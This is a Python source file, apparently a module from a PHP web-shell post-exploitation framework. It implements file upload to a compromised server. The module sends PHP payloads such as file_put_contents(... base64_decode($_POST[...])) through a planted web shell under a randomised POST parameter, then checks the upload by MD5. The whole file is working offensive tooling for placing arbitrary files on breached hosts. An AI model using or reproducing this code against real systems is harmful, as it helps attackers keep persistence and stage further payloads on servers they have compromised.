'''
Created on 23/set/2011

@author: norby
'''

from core.module import Module, ModuleException
from core.vector import VectorList, Vector
from core.http.cmdrequest import CmdRequest, NoDataException
from base64 import b64encode
from random import choice
from hashlib import md5
from core.parameters import ParametersList, Parameter as P

classname = 'Upload'
    
class Upload(Module):    
    '''Upload binary/ascii file to the target filesystem'''
    
    
    vectors = VectorList([
        Vector('shell.php', 'file_put_contents', "file_put_contents('%s', base64_decode($_POST['%s']));"),
        Vector('shell.php', 'fwrite', '$h = fopen("%s", "w"); fwrite($h, base64_decode($_POST["%s"]));')
        ])
    
    params = ParametersList('Upload a file to the target filesystem', vectors,
            P(arg='lpath', help='Local file path', required=True, pos=0),
            P(arg='rpath', help='Remote path', required=True, pos=1)
            )
    
    def __init__(self, modhandler, url, password):
        Module.__init__(self, modhandler, url, password)    
        
        self.file_content = None
        
        self.rand_post_name = ''.join([choice('abcdefghijklmnopqrstuvwxyz') for i in xrange(4)])
        
        
        
    def __execute_payload(self, vector, parameters):
        
        file_encoded_content = parameters[0]
        file_local_md5 = parameters[1]
        remote_path = parameters[2]

        payload = vector.payloads[0] % (remote_path, self.rand_post_name)
        self.modhandler.load(vector.interpreter).set_post_data({self.rand_post_name : file_encoded_content})
        self.modhandler.load(vector.interpreter).run({0 : payload})
        
            
        file_remote_md5 = self.modhandler.load('file.check').run({'rpath' : remote_path, 'mode' : 'md5'})
        if file_remote_md5 == file_local_md5:
            self.mprint('[%s] File \'%s\' uploaded.' % (self.name, remote_path))
            return True
        else:
            file_exists = self.modhandler.load('file.check').run({'rpath' : remote_path, 'mode' :'exists'})
            if file_exists:
                self.mprint('[!] [%s] MD5 hash of \'%s\' file mismatch, file corrupted.' % (self.name, remote_path))
            else:
                self.mprint ('[!] [%s] File \'%s\' creation failed, check remote path and permissions.' % ( self.name, remote_path))
    
    def set_file_content(self, content):
        """Cleaned after use"""
        
        self.file_content = content

    def run_module( self, local_path, remote_path):
        
                
        if not self.file_content:
        
            try:
                local_file = open(local_path, 'r')
            except Exception, e:
                raise ModuleException(self.name,  "Open file '%s' failed" % (local_path))
            
            file_content = local_file.read()
        else:
            file_content = self.file_content[:]
            self.file_content = None
            
            
        file_local_md5 = md5(file_content).hexdigest()
        file_encoded_content = b64encode(file_content)

        if self.modhandler.load('file.check').run({'rpath' : remote_path, 'mode' : 'exists'}):
            self.mprint("[%s] Warning, remote file %s already exists" % (self.name,remote_path))
            
                
        vectors = self._get_default_vector2()
        if not vectors:
            vectors  = self.vectors.get_vectors_by_interpreters(self.modhandler.loaded_shells)
        
        for vector in vectors:
            response = self.__execute_payload(vector, [file_encoded_content,  file_local_md5, remote_path])
            if response:
                self.params.set_and_check_parameters({'vector' : vector.name})
                return

        
